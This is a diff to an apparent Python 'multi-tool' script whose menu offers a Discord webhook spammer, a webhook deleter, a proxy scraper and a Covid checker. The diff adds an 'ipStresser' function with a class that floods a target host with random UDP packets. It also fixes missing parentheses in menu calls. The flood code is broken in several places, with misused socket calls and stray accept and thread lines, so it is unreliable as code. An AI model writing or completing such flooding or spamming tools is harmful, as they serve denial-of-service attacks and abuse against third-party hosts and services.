@@ -2,7 +2,7 @@ import os, requests, time, sys, random, socket, urllib
 from datetime import datetime
 import pprint
 from dhooks import Webhook
-import socket
+import socket, threading
 from covid import Covid
 
 def log(name):
@@ -89,8 +89,33 @@ def covidCheck():
             time.sleep(8)
             log("Covid")
             Main()
-    
-
+def ipStresser():
+    class Denial:
+        def __init__(self, host, port):
+                threading.Thread.__init__(self)
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                self.connection =setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR)
+                self.host = host
+                self.port = 80
+                self.duration = 0
+                self.bytes = random._urandom(1024)
+                self.send = 0
+        def send_packet(self):
+            while True:
+                try:
+                    send_all = self.connection.sendto(self.bytes(self.host, self.port))
+                    print("[+] flood has started on " + self.host)
+                except UnboundLocalError:
+                    try:
+                        pass
+                        send_all = self.connection.sendto(self.bytes(self.host, self.port))
+                    except:
+                        pass
+                except KeyboardInterrupt:
+                    print("\n [-] Exiting... ")
+            while True:
+                connect_all = send_all.accept()
+                newthread = ClientThread(send_all)
 # main code
 class Main():
     def cls(self):
@@ -122,16 +147,16 @@ class Main():
                 self.start_logo()
                 ProxyScrape()
             elif(choose == str(3)):
-                self.cls
-                self.start_logo
+                self.cls()
+                self.start_logo()
                 webhookSpammer()
             elif(choose == str(4)):
-                self.cls
-                self.start_logo
+                self.cls()
+                self.start_logo()
                 webhookDelete()
             elif(choose == str(5)):
-                self.cls
-                self.start_logo
+                self.cls()
+                self.start_logo()
                 covidCheck()
 
 
